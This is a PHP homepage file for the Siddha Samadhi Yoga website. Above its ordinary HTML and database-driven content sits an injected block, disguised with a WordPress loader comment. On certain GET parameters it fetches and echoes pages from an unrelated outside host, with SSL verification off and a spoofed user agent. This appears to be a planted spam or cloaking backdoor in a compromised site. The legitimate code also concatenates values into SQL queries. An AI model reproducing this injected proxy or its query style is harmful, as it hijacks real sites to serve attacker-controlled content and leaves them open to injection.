<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/ssy/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/ssy/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/ssy/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
if(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/ssy/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
	
} else {
  ?>


  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="google-site-verification" content="nNDGlf-Amg8KgcpiC0XW-ks7t5tURbA93YMT4TMwfwc" />

<title>Siddha Samadhi Yoga</title>

<meta name="description" content="Founded by Guruji Rishi Prabhakar in 1974, SSY is the rediscovery of the ancient Vedic science of effortless and joyful living. It is a technology to unlock the vast potential within every human being." />

<meta property="og:image" content="http://www.ssy.org/images/screenshot-ssy.jpg"/>

<link href="css/mainMenu.css" rel="stylesheet" type="text/css" />
<link href="css/style.css" rel="stylesheet" type="text/css" />
<link href="css/tabs.css" rel="stylesheet" type="text/css" />
<link rel="stylesheet" href="css/flexslider.css" type="text/css" media="all" />
<script src="js/jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="js/jquery.flexslider-min.js" type="text/javascript"></script>

<script type="text/javascript">
   (function($) {
      $(window).load(function(){
      $('.flexslider').flexslider({
        animation: "fade",
        start: function(slider){
          $('body').removeClass('loading');
        }
      });
    });
   })(jQuery);
</script>

<script type="text/javascript" src="js/jquery.jcarousel.min.js"></script>
<script type="text/javascript" src="js/toplinks.js"></script>
<script type="text/javascript" src="js/tabs.js"></script>
</head>
<body>
<?php
error_reporting(0);
include'includes/social.php';
include'admin/connection.php'; 
error_reporting(0);
function limit_words($string, $word_limit)
{
    $words = explode(" ",strip_tags($string));
    return implode(" ",array_splice($words,0,$word_limit));
}
?><div class="wrapper">

  <!--==========================header=========================-->
  <?php include'includes/header.php'; ?>
  <!--==========================Slider=========================-->
  
  <div id="slider" class="flexslider">
    <ul class="slides"><?php 
$s = mysql_fetch_array(mysql_query("select * from level0 where id  = '1' ")) or die (mysql_error()); 
$explodemultiple = explode(",",$s['slider']);

if($s['slider'] != '' && $s['slider'] != ',' && $s['slider'] != ',,' && $s['slider'] != ',,,')
{
	for($l=0; $l < count($explodemultiple); ++$l)
	{
		if($explodemultiple[$l] != '')
		{ $explodemultiple[$l] = trim($explodemultiple[$l],",");
		
		$links = mysql_fetch_array(mysql_query("select * from slider_images where images = '".$explodemultiple[$l]."'"))
		
		?><li><?php if($links['link'] != '' && $links['link'] != "#") { ?><a href="<?php echo $links['link']; ?>"><img src="images/<?php echo $explodemultiple[$l]; ?>" width="1170" height="358" /></a><?php } else { ?><img src="images/<?php echo $explodemultiple[$l]; ?>" width="1170" height="358" /><?php } ?></li><?php
		}
	}
}
else { ?><li><img src="images/slide1.jpg" width="1170" height="358" /></li><?php  } ?></ul>

  </div>
  <div><img src="images/sliderShadow.png" width="1170" height="30" /></div>
  <!--==========================5 Circles=========================-->
  <div class="content">
    <div class="circleShell">
      <div class="circle"><a href="detail.php?id=9" class="circleOne"></a></div>
      <div class="circle"><a href="detail.php?id=10" class="circleTwo"></a></div>
      <div class="circle"><a href="detail.php?id=11" class="circleThree"></a></div>
      <div class="circle"><a href="#" class="circleFour"></a></div>
      <div class="circle"><a href="http://www.ssy.org/webshop" class="circleFive"></a></div>
    </div>
    <div class="divider"> <span><img src="images/design.jpg" /></span></div>
    <div class="">
      <div class="cell cellWidth408">
        <div class="tabs">
          <ul>
            <li><a href="#tab-1">ABOUT SSY</a></li>
            <li><a href="#tab-2">VISION</a></li>
            <li><a href="#tab-3">PLEDGE</a></li>
            <li><a href="#tab-4"> PURPOSE</a></li>
          </ul>
          <div id="tab-1">
            <p align="justify"><img src="images/thumb.jpg" width="100" height="120" class="thumbs"/><?php
			$abt = mysql_fetch_array(mysql_query("select * from level1 where id = '1' ")) or die (mysql_error());
			echo limit_words($abt['content'],40)."..."; //substr(strip_tags($abt['content']), 0, 250); 
			?><br/>
              <a href="detail.php?id=1" class="more">Read more...</a> </p>
           </div>
           <div id="tab-2">
           <p align="justify"><img src="images/thumb.jpg" width="100" height="120" class="thumbs"/> <?php
			$vis = mysql_fetch_array(mysql_query("select * from level1 where id = '4' ")) or die (mysql_error());
			echo limit_words($vis['content'],40)."...";
			?><br /><br /><br />
              <a href="detail.php?id=4" class="more">Read more...</a> </p>
           </div>
           <div id="tab-3">
           <p align="justify"><img src="images/thumb.jpg" width="100" height="120" class="thumbs"/><?php
			$ple = mysql_fetch_array(mysql_query("select * from level1 where id = '3' ")) or die (mysql_error());
			echo limit_words($ple['content'],40)."...";
			?><br/><br /><br />
              <a href="detail.php?id=3" class="more">Read more...</a> </p>
           </div>
           <div id="tab-4">
           <p align="justify"><img src="images/thumb.jpg" width="100" height="120" class="thumbs"/><?php
			$ple = mysql_fetch_array(mysql_query("select * from level1 where id = '2' ")) or die (mysql_error());
			echo limit_words($ple['content'],40)."...";
		   ?><br/><br /><a href="detail.php?id=2" class="more">Read more...</a></p>
           </div>
        </div>
      </div>
      <div class=" noBg lFlote "> <img src="images/guruJi.jpg" /></div>
      <div class="cell cellWidth408">
        <div class="tabs2">
          <ul>
            <li><a href="#tab-5">EVENTS</a></li>
            <li><a href="#tab-6"> FESTIVALS </a></li>
          </ul>
          <div id="tab-5">
            <p><table>
                     
                
                
            
               <tr><td width="295" height="25" align="left"><a href="/pdf/RSVK Programs.pdf">* RSVK Programs</a></td>
               <tr><td width="295" height="25" align="left"><a href="/pdf/Memory Program.pdf">* RCRT Summar Camp</a></td>
               <tr><td width="295" height="25" align="left"><a href="/pdf/Children SSY Camp.pdf">* Children SSY Fun Camps</a></td>
                <tr><td width="295" height="25" align="left"><a href="/pdf/Rishi joy therapy.pdf">*  Rishi Joy Therapy  </a> </td>
                
                
                            <td width="164"></td></tr>
        
                
                            <td width="164"></td></tr>
            
                <td width="164"></td></tr>
           </table>
            <br/><a href="upcoming_events.php" class="more"></a> </p>
          </div>
          <div id="tab-6">
            <p><table>
            <tr><td width="270"  height="25" align="left"><a href="http://ssy.org/detail.php?id=63">* Arandhana Day Celebration - Bhagawan</a></td>
            <td width="10"></td>
            </tr>
            <tr><td width="290"  height="25" align="left"><a href="http://ssy.org/detail.php?id=62">* Arandhana Day Celebration - Mantralayam</a></td>
            <td width="10"></td>
            </tr>
            <tr><td width="270"  height="25" align="left"><a href="http://ssy.org/detail.php?id=60">* Gurupoornima</a></td>
            <td width="10"></td>
            </tr>
<tr><td width="270"  height="25" align="left"><a href="http://ssy.org/detail.php?id=61">* Brahmostav</a></td>
            <td></td>
            </tr>
            <tr><td width="270"  height="25" align="left"><a href="http://ssy.org/detail.php?id=59">* Navratri Utsav</a></td>
            <td></td>
            </tr> 
            <tr><td width="270"  height="25" align="left"><a href="http://ssy.org/detail.php?id=58">* Vishwa Hriday Sammelan</a></td>
            <td width="10"></td>
            </tr>
             <tr><td width="270"  height="25" align="left"></td>
            <td></td>
            </tr>            
              
           </table><br/>
               </p>
          </div>
          <div id="tab-7">
            <p><!--<br/>
              <a href="#" class="more">Read more...</a> --></p>
          </div>
        </div>
      </div>
      <div class="allClear"></div>
    </div>

    <div class="guruBani "><marquee><span>TODAY’S GURUVANI : </span><?php 
	
	$td = date("d-m-Y");
	$tds = mysql_query("select * from guruvani where date = '".$td."' limit 0,1");
	if(mysql_num_rows($tds) > 0)
	{
		$tdf = mysql_fetch_array($tds); $guruvani = $tdf['content']; echo $guruvani; ?></marquee> </div> <?php
	}
	else 
	{
		$g = mysql_query("select * from guruvani order by id desc limit 0,1") or die (mysql_error());
		$gv = mysql_fetch_array($g); $guruvani = $gv['content']; echo $guruvani; ?></marquee> </div> <?php 
	}
	?><div class="imgLinks">
      <ul>
        <li><a href="main.php?id=8"><img src="images/imgAshrams.jpg" /></a></li>
        <li><a href="main.php?id=7"><img src="images/imgEducation.jpg" /></a></li>
        <li><a href="main.php?id=9"><img src="images/imgGlobal.jpg" /></a></li>
        <li><a href="main.php?id=6"><img src="images/imgProjects.jpg" /></a></li>
      </ul>
      <div class="allClear"></div>
    </div>
    <div class="">
      <div class="cell cellWidth340">
        <div class="tabs3">
          <ul>
            <li><a href="#tab-8">TESTIMONIALS</a></li>
            <li><a href="#tab-9">MEDIA</a></li>
          </ul>
          <div id="tab-8">
            <p>It was in July, 2005 that I heard about SSY classes from my friends. At that point in time I was experiencing symptoms of dullnessThe program was very enlightening.  It provided a safe space for sharing and listening.  Guriji’s method of teaching is quite provocative ...<br/>
              <a href="#" class="more"><em>Uday Thakur</em></a> </p>
          </div>
          <div id="tab-9">
            <p>Sonali Kulkarni and Varun Vadola realize that to win the game, they need to play actively. Both have decided to re-invent themselves by shedding excess fat and baggage... Ashwini Desmukh<br/>
              <a href="media.php?id=64" class="more">Read more...</a></p>
          </div>
         
        </div>
      </div>
     <!-- <div class="lFlote cellWidth195 pad20 list">
        <h3 align="center">LOCATORS</h3>
        <ul>
          <li><a href="#"> <img src="images/iocnLocator.gif" align="absmiddle" />Locate a center</a></li>
          <li><a href="#"> <img src="images/iconProgramme.gif" align="absmiddle"/>Locate a programme</a></li>
          <li><a href="#"><img src="images/iconMike.gif" align="absmiddle"/>Locate a training</a></li>
        </ul>
      </div>-->
      <div class="lFlote cellWidth340 pad20 vLine">
        <h3>PARTICIPATE WITH US</h3>
       <!-- <div class="iconBox"><a href="wishto_gift.php"><img src="images/iconGift.gif" /><br />
          Gift</a></div>-->
       <!-- <div class="iconBox"><a href="enroll.php"><img src="images/iconEnroll.png"/><br />
          Enroll</a></div>-->
        <div class="iconBox" style="padding-left:70px;"><a href="donate.php"><img src="images/donate-us-ssy.png" width="80" /><br /><br />
          Donate</a></div>
        <div class="iconBox"><a href="serve.php"><img src="images/serve-ssy.svg" width="80" /><br /><br />
          Serve</a></div>
      </div>
      <div class="vLine2 lFlote marginTop10" >
        <h3 class="marginTop10" style="text-align:center;">LIVE VIDEO</h3>
      <?php
	//	$mf =   mysql_query("select video from livevideo") or die (mysql_error());
	//  if($mfg = mysql_fetch_array($mf))
	//  {
		?><div class="liveVideo "><!--<img src="images/imgVideo.gif" width="257" height="173" /><iframe width="350" height="173" src="http://www.youtube.com/embed/-jWBmW6gJm0" frameborder="0" allowfullscreen></iframe>-->
		<iframe width="350" height="173" src="https://www.youtube.com/embed/rrdun7obHJ8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe></div>
	<?php //}  ?>   
      
      </div>
      <div class="allClear"></div>
    </div>
  </div>
  <?php include'includes/footer.php'; ?>
  <div class="allClear"></div>
</DIV>
<!-- FlexSlider -->
<script defer src="js/jquery.flexslider.js"></script>
<script type="text/javascript">
    $(function(){
      SyntaxHighlighter.all();
    });
    $(window).load(function(){
      $('#carousel').flexslider({
        animation: "slide",
        controlNav: false,
        animationLoop: false,
        slideshow: false,
        itemWidth: 125,
        itemMargin: 0,
	mousewheel: true,  
	pausePlay: false,  //Boolean: Create pause/play dynamic element
 
        });
      
      $('#slider').flexslider({
        animation: "fade",
        controlNav: true,
        animationLoop: false,
        slideshow: false,
        start: function(slider){
          $('body').removeClass('loading');
        }
      });
    });
  </script>
  

</body>
</html>
<?php
  
}
?>
